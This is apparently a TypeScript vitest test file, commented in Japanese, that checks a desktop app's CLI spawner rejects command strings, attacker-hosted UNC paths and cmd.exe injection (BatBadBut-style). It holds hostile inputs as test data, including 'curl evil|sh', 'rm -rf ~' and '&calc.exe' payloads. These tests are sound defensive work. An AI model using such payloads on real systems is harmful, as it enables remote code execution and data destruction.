import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

import { afterAll, describe, expect, it } from "vitest";

import {
  assertUsableCliBinPath,
  encodeWindowsShellArgv,
  spawnCliProcess,
  isShellSpawnRequired,
  resolveBareBinNames,
  resolveCliBinForSpawn,
} from "./cli-spawn";

/**
 * 開発機は macOS で Windows 経路の実機検証ができない。プラットフォームを **引数で受ける純関数**
 * にしてあるのはそのためで (`process.platform` の monkeypatch はしない)、Windows 側の挙動は
 * ここで固定するのが唯一のゲートになる。
 */

const workDir = mkdtempSync(path.join(tmpdir(), "cli-spawn-test-"));

afterAll(() => {
  rmSync(workDir, { force: true, recursive: true });
});

function writeBin(name: string, mode: number): string {
  const filePath = path.join(workDir, name);
  writeFileSync(filePath, "#!/bin/sh\nexit 0\n");
  chmodSync(filePath, mode);
  return filePath;
}

describe("isShellSpawnRequired", () => {
  it("needs a shell only for the Windows shims that cannot be spawned directly", () => {
    // Node 18.20.2 / 20.12.2 以降、`shell: false` で `.cmd` / `.bat` を spawn すると EINVAL に
    // なる (CVE-2024-27980 の修正)。この 2 つだけは shell を外せない。
    expect(isShellSpawnRequired("C:\\x\\agy.cmd", "win32")).toBe(true);
    expect(isShellSpawnRequired("C:\\x\\agy.bat", "win32")).toBe(true);
    expect(isShellSpawnRequired("C:\\x\\agy.CMD", "win32")).toBe(true);
    expect(isShellSpawnRequired("C:\\x\\agy.exe", "win32")).toBe(false);
    expect(isShellSpawnRequired("C:\\x\\agy.com", "win32")).toBe(false);
  });

  it("no longer asks for a shell just because the name is bare", () => {
    // 「非絶対パスなら shell」は、裸名を cmd.exe に解決させるための分岐だった。shell 経由は
    // コマンド文字列として解釈される経路そのものなので、PATH 解決を自前で持って分岐を消す。
    expect(isShellSpawnRequired("agy", "win32")).toBe(false);
    expect(isShellSpawnRequired("codex", "win32")).toBe(false);
  });

  it("never uses a shell off Windows", () => {
    for (const bin of ["/Users/x/.local/bin/agy", "agy", "/usr/local/bin/agy.cmd"]) {
      expect(isShellSpawnRequired(bin, "darwin"), bin).toBe(false);
      expect(isShellSpawnRequired(bin, "linux"), bin).toBe(false);
    }
  });
});

describe("assertUsableCliBinPath", () => {
  it("rejects a command string, which is the XSS→RCE bridge this exists to close", () => {
    // レンダラで任意 JS が動くと `desktopAPI` 経由で set-bin を呼べる。文字列がそのまま
    // spawn のコマンド名になるので、ここが通ると任意コマンド実行になる。
    for (const value of ["cmd /c calc &", "sh -c 'curl evil|sh'", "agy; rm -rf ~"]) {
      expect(assertUsableCliBinPath(value, "darwin").ok, value).toBe(false);
    }
  });

  it("rejects anything that is not an absolute path to an existing file", () => {
    expect(assertUsableCliBinPath("agy", "darwin").ok).toBe(false);
    expect(assertUsableCliBinPath("../../../usr/bin/env", "darwin").ok).toBe(false);
    expect(assertUsableCliBinPath(path.join(workDir, "missing"), "darwin").ok).toBe(false);
    expect(assertUsableCliBinPath(workDir, "darwin").ok).toBe(false);
    expect(assertUsableCliBinPath("", "darwin").ok).toBe(false);
    expect(assertUsableCliBinPath(`/tmp/${"a".repeat(5000)}`, "darwin").ok).toBe(false);
  });

  it("rejects paths carrying a NUL, CR, or LF", () => {
    const usable = writeBin("ok-control", 0o755);
    for (const suffix of ["\u0000x", "\rx", "\nx"]) {
      expect(assertUsableCliBinPath(`${usable}${suffix}`, "darwin").ok, JSON.stringify(suffix)).toBe(false);
    }
  });

  it("requires the executable bit on posix", () => {
    expect(assertUsableCliBinPath(writeBin("not-executable", 0o644), "darwin").ok).toBe(false);
    expect(assertUsableCliBinPath(writeBin("executable", 0o755), "darwin")).toEqual({
      ok: true,
      path: path.join(workDir, "executable"),
    });
  });

  // Windows の規則は本物の `C:\…` を渡して評価する。macOS の一時ファイルで代用すると
  // `path.win32.isAbsolute` が false になり、どの win32 分岐にも到達しないまま緑になる。
  const windowsProbe = { isExecutable: () => true, isFile: () => true };

  it("requires a launchable extension on Windows instead of the executable bit", () => {
    // Windows に実行ビットは無い。拡張子が唯一の判断材料になる。
    for (const name of ["agy.exe", "agy.cmd", "agy.bat", "agy.com"]) {
      expect(assertUsableCliBinPath(`C:\\tools\\${name}`, "win32", windowsProbe).ok, name).toBe(true);
    }
    expect(assertUsableCliBinPath("C:\\tools\\agy.txt", "win32", windowsProbe).ok).toBe(false);
    expect(assertUsableCliBinPath("C:\\tools\\agy", "win32", windowsProbe).ok).toBe(false);
  });

  it("refuses a UNC or device path, which would run a binary the attacker hosts", () => {
    // `path.win32.isAbsolute` は UNC も真にし、`statSync` は SMB / WebDAV を透過的に辿る。
    // 「実在する .exe」を攻撃者のホストが用意できてしまうので、ドライブ直下に限定する。
    for (const value of [
      "\\\\attacker\\share\\payload.exe",
      "\\\\attacker.example.com@SSL@443\\dav\\payload.exe",
      "\\\\?\\UNC\\host\\share\\payload.exe",
      "\\\\.\\pipe\\payload.exe",
      "//attacker/share/payload.exe",
      "\\payload.exe",
      "C:payload.exe",
    ]) {
      expect(assertUsableCliBinPath(value, "win32", windowsProbe).ok, value).toBe(false);
    }
    expect(assertUsableCliBinPath("C:/tools/agy.exe", "win32", windowsProbe).ok).toBe(true);
  });

  it("requires a real file even when the shape is right", () => {
    const missing = { isExecutable: () => true, isFile: () => false };
    expect(assertUsableCliBinPath("C:\\tools\\agy.exe", "win32", missing).ok).toBe(false);
  });

  it("accepts a path containing spaces", () => {
    // macOS の `/Applications/My App/…` は普通に空白を含む。制御文字と混同して弾かない。
    mkdirSync(path.join(workDir, "My App"), { recursive: true });
    const spaced = writeBin(path.join("My App", "agy"), 0o755);

    expect(assertUsableCliBinPath(spaced, "darwin")).toEqual({ ok: true, path: spaced });
  });

  it("keeps surrounding whitespace out of the accepted path", () => {
    const usable = writeBin("trimmed", 0o755);
    expect(assertUsableCliBinPath(`  ${usable}  `, "darwin")).toEqual({ ok: true, path: usable });
  });

  it("explains why it refused, so the renderer can show it", () => {
    const result = assertUsableCliBinPath("agy", "darwin");
    expect(result.ok).toBe(false);
    expect(result.ok === false && result.reason.length).toBeGreaterThan(0);
  });
});

describe("resolveBareBinNames / resolveCliBinForSpawn", () => {
  // 実在判定を差し替えて、本物の `C:\…` を渡して Windows のセマンティクスを評価する。
  function windowsFs(existing: readonly string[]) {
    const files = new Set(existing.map((entry) => entry.toLowerCase()));
    return { isExecutable: () => true, isFile: (p: string) => files.has(p.toLowerCase()) };
  }

  const winEnv = { PATH: "C:\\tools;C:\\npm", PATHEXT: ".COM;.EXE;.BAT;.CMD" };

  it("resolves a bare name through PATH and PATHEXT on Windows", () => {
    // 裸名が shell で解決されなくなるぶん、PATH/PATHEXT の走査を自前で持つ。これが無いと
    // Windows で CLI が見つからなくなる。
    expect(resolveBareBinNames(["agy1"], "win32", winEnv, windowsFs(["C:\\npm\\agy1.CMD"])))
      .toEqual(["C:\\npm\\agy1.CMD"]);
  });

  it("prefers a directly spawnable extension over an extension-less script", () => {
    // npm は Windows に `codex` (sh script) と `codex.exe` を同居させる。拡張子なしを先に採ると
    // CreateProcess できないスクリプトへ解決してしまう。PATHEXT の順にも従う。
    expect(resolveBareBinNames(
      ["codex2"],
      "win32",
      winEnv,
      windowsFs(["C:\\tools\\codex2", "C:\\tools\\codex2.CMD", "C:\\tools\\codex2.EXE"]),
    )).toEqual(["C:\\tools\\codex2.EXE"]);
  });

  it("always resolves to an absolute path, never a bare command name", () => {
    // 裸名を返すと `shell: true` 経路で cmd.exe が **カレントディレクトリを PATH より先に**
    // 解決する。spawn の cwd は AI が書けるワークスペースなので、そこに `codex.cmd` を置かれると
    // 次回の起動でそれが動いてしまう (binary planting)。
    const resolved = resolveBareBinNames(["codex3"], "win32", winEnv, windowsFs(["C:\\npm\\codex3.CMD"]));

    expect(resolved).toEqual(["C:\\npm\\codex3.CMD"]);
    expect(resolved.every((bin) => path.win32.isAbsolute(bin))).toBe(true);
  });

  it("keeps absolute candidates untouched and drops unresolvable bare names", () => {
    expect(resolveBareBinNames(
      ["C:\\tools\\agy.exe", "definitely-not-installed"],
      "win32",
      winEnv,
      windowsFs(["C:\\tools\\agy.exe"]),
    )).toEqual(["C:\\tools\\agy.exe"]);
  });

  it("does not remember a failed lookup, so a CLI installed later is found", () => {
    // 各クライアントは「否定はキャッシュせず、後からインストールした場合に即座に再検出」を
    // 明示している。ここで否定を覚えると、アプリを開いたまま入れたユーザーは再起動するまで
    // 見つけられない。
    const name = `later-${Math.random().toString(36).slice(2)}`;
    expect(resolveCliBinForSpawn(name, "win32", winEnv, windowsFs([]))).toBe(name);
    expect(resolveCliBinForSpawn(name, "win32", winEnv, windowsFs([`C:\\tools\\${name}.EXE`])))
      .toBe(`C:\\tools\\${name}.EXE`);
  });

  it("resolves the bin used at spawn time, not just the candidate list", () => {
    // 設定ファイルに残っている裸名や、候補が 1 つも解決しなかったときのフォールバックも
    // PATH 解決へ載せる。載せないと `shell` を外したぶん `.cmd` インストールが起動しなくなる。
    expect(resolveCliBinForSpawn("claude4", "win32", winEnv, windowsFs(["C:\\npm\\claude4.CMD"])))
      .toBe("C:\\npm\\claude4.CMD");
    expect(isShellSpawnRequired("C:\\npm\\claude4.CMD", "win32")).toBe(true);
    // posix は元から shell に依存していない。触らない。
    expect(resolveCliBinForSpawn("claude4", "darwin", winEnv)).toBe("claude4");
  });

  it("leaves posix candidate lists exactly as they are", () => {
    // posix の spawn は shell 無しでも PATH から裸名を解決する。触る理由が無く、触ると
    // 既存の bin 解決の挙動が変わってしまう。
    const candidates = ["/opt/homebrew/bin/agy", "agy"];
    expect(resolveBareBinNames(candidates, "darwin", winEnv)).toEqual(candidates);
    expect(resolveBareBinNames(candidates, "linux", winEnv)).toEqual(candidates);
  });
});

describe("encodeWindowsShellArgv", () => {
  /**
   * `shell: true` のとき Node はコマンド行を `cmd /d /s /c "<file> <args...>"` へそのまま
   * 流し込む (`windowsVerbatimArguments`)。つまり **cmd.exe のパーサと、起動される側の
   * `CommandLineToArgvW` の 2 段**を通る。片方だけ考えると、`&` はコマンド区切りとして解釈され、
   * `"` は cmd の引用状態を切り替えてしまう。
   */

  /** cmd.exe の視点。`^` の直後の 1 文字はリテラルなので、そこを取り除いた残りを見る。 */
  function unescapeCaret(encoded: string): string {
    return encoded.replace(/\^(.)/gu, "$1");
  }

  /** `CommandLineToArgvW` の規則で 1 引数へ戻す (cmd の `^` を剥がしたあとの文字列に適用)。 */
  function parseCommandLineToArgv(commandLine: string): string[] {
    const argv: string[] = [];
    let current = "";
    let quoted = false;
    let index = 0;
    let started = false;
    while (index < commandLine.length) {
      const char = commandLine[index];
      if (char === "\\") {
        let slashes = 0;
        while (commandLine[index] === "\\") {
          slashes += 1;
          index += 1;
        }
        if (commandLine[index] === '"') {
          current += "\\".repeat(Math.floor(slashes / 2));
          if (slashes % 2 === 1) {
            current += '"';
            index += 1;
          }
        } else {
          current += "\\".repeat(slashes);
        }
        started = true;
        continue;
      }
      if (char === '"') {
        // 引用の内側の `""` は引用符 1 個 (`CommandLineToArgvW` の規則)。
        if (quoted && commandLine[index + 1] === '"') {
          current += '"';
          index += 2;
          started = true;
          continue;
        }
        quoted = !quoted;
        started = true;
        index += 1;
        continue;
      }
      if (!quoted && /\s/u.test(char)) {
        if (started) {
          argv.push(current);
          current = "";
          started = false;
        }
        index += 1;
        continue;
      }
      current += char;
      started = true;
      index += 1;
    }
    if (started) {
      argv.push(current);
    }
    return argv;
  }

  /**
   * cmd.exe の引用状態で走査して、引用の外に残ったコマンド区切りを列挙する。
   * `shell: true` になるのは `.cmd` / `.bat` だけ = 必ず npm シム経由で、シムの `%*` は
   * **cmd.exe がもう一度パースする**。この 3 段目を見ないと、`\"` で引用が閉じて `&` が
   * 生き返る CVE-2024-24576 型の穴をテストが素通りする。
   */
  function unquotedMetacharacters(commandLine: string): string[] {
    const found: string[] = [];
    let quoted = false;
    for (const char of commandLine) {
      if (char === '"') {
        quoted = !quoted;
        continue;
      }
      if (!quoted && "&|<>".includes(char)) {
        found.push(char);
      }
    }
    return found;
  }

  /**
   * エンコード → cmd.exe (1 段目) → シムの `%*` 再パース (2 段目) → `CommandLineToArgvW`。
   * 原文に戻り、かつ途中でコマンド区切りが露出しなければ「リテラル 1 引数」。
   */
  function roundTrip(args: readonly string[]): string[] {
    const encoded = encodeWindowsShellArgv(args);
    if (!encoded.ok) {
      throw new Error(encoded.reason);
    }
    // cmd.exe の 1 段目でキャレットは消費される。以降はバッチ行に埋め込まれて再パースされる。
    const afterCmd = unescapeCaret(encoded.argv.join(" "));
    expect(unquotedMetacharacters(afterCmd), afterCmd).toEqual([]);
    return parseCommandLineToArgv(afterCmd);
  }

  it("delivers cmd.exe metacharacters as literal text", () => {
    for (const value of [
      '--print=hello " & calc.exe',
      "--print=a|b",
      "--print=a&b",
      "--print=a^b",
      "--print=a<b>c",
      "--print=a(b)c",
      "--print=a!b",
      '--print=say "hi"',
      "--print=trailing backslash\\",
      '--print=quote after slash\\"',
      "--print=日本語と記号 & | ^ ( ) !",
      "",
    ]) {
      expect(roundTrip([value]), value).toEqual([value]);
    }
  });

  it("keeps every argument separate, spaces and all", () => {
    const args = ["--model", "Gemini 3.5 Flash (High)", "--print=x & y", "C:\\log dir\\a.log"];
    expect(roundTrip(args)).toEqual(args);
  });

  it("survives the npm shim re-parsing the line a second time", () => {
    // `claude.cmd` の末尾は `node cli.js %*`。引用符を `\"` で表すと 2 回目の cmd パースで
    // 引用が閉じ、続く `&` が本物のコマンド区切りになる (CVE-2024-24576 / BatBadBut)。
    const payload = 'sonnet" &calc.exe& rem x';
    const encoded = encodeWindowsShellArgv(["--model", payload]);
    expect(encoded.ok).toBe(true);
    if (!encoded.ok) return;

    const afterCmd = unescapeCaret(encoded.argv.join(" "));
    const batchLine = `node cli.js ${afterCmd}`;

    expect(unquotedMetacharacters(batchLine)).toEqual([]);
    expect(parseCommandLineToArgv(batchLine)).toEqual(["node", "cli.js", "--model", payload]);
  });

  it("leaves no raw metacharacter for cmd.exe to act on", () => {
    const encoded = encodeWindowsShellArgv(['--print=hello " & calc.exe']);
    expect(encoded.ok).toBe(true);
    if (!encoded.ok) return;
    // `^` を剥がす前の文字列で、エスケープされていない `&` や `"` が残っていないこと。
    expect(encoded.argv[0].replace(/\^./gu, "")).not.toMatch(/["&|<>()!]/u);
  });

  it("refuses arguments cmd.exe cannot represent instead of breaking silently", () => {
    // コマンド行に改行は書けない。`%` は引用符の中でも変数展開され、リテラルにする手段が無い。
    for (const value of ["line1\nline2", "line1\r\nline2", "a\u0000b", "100%の確率", "%PATH%"]) {
      const encoded = encodeWindowsShellArgv([value]);
      expect(encoded.ok, JSON.stringify(value)).toBe(false);
      expect(encoded.ok === false && encoded.reason.length).toBeGreaterThan(0);
    }
  });

  it("keeps a command name with spaces as one token", () => {
    // `^"` は「リテラルな引用符」であって cmd の引用状態を開かない = トークンをまとめない。
    // 区切り文字自体をエスケープしていないと、空白入りの shim パスがそこで切れて起動に失敗する。
    const encoded = encodeWindowsShellArgv(["C:\\Program Files\\nodejs\\claude.cmd", "--model", "sonnet"]);
    expect(encoded.ok).toBe(true);
    if (!encoded.ok) return;

    // cmd の 1 段目から見て、生の (エスケープされていない) 空白が残っていないこと。
    expect(encoded.argv[0]).not.toMatch(/(?<!\^) /u);
  });

  it("quotes the command name too", () => {
    // `shell: true` のとき Node はコマンド名をクォートしない。空白入りの絶対パスはそこで壊れる。
    const args = ["C:\\Program Files\\nodejs\\claude.cmd", "--model", "sonnet"];
    expect(roundTrip(args)).toEqual(args);
  });
});

describe("spawnCliProcess", () => {
  it("passes the argv through untouched off Windows", () => {
    // macOS / Linux は `shell: false` 固定。Windows 用のエンコードが漏れると値が壊れる。
    const script = writeBin("echo-argv", 0o755);
    writeFileSync(script, "#!/bin/sh\nprintf '%s\\n' \"$@\"\n");

    const args = ['say "hi" & echo %PATH%', "line1\nline2", "a^b|c"];
    const child = spawnCliProcess(script, args, { stdio: "pipe" }, "darwin");
    const chunks: Buffer[] = [];
    child.stdout.on("data", (chunk: Buffer) => chunks.push(chunk));

    return new Promise<void>((resolve, reject) => {
      child.on("error", reject);
      child.on("close", () => {
        expect(Buffer.concat(chunks).toString("utf8").split("\n").slice(0, -1)).toEqual(
          args.join("\n").split("\n"),
        );
        resolve();
      });
    });
  });

  it("refuses to launch instead of silently mangling an unrepresentable argument", () => {
    // Windows + `.cmd` + 複数行プロンプトは現状すでに壊れている。黙って壊れる (あるいは黙って
    // 任意コマンドが走る) より、理由付きで止まる方がよい。
    expect(() => spawnCliProcess("C:\\npm\\agy.cmd", ["--print=line1\nline2"], {}, "win32"))
      .toThrow(/改行/u);
    expect(() => spawnCliProcess("C:\\npm\\agy.cmd", ["--print=100%"], {}, "win32"))
      .toThrow(/%/u);
  });
});
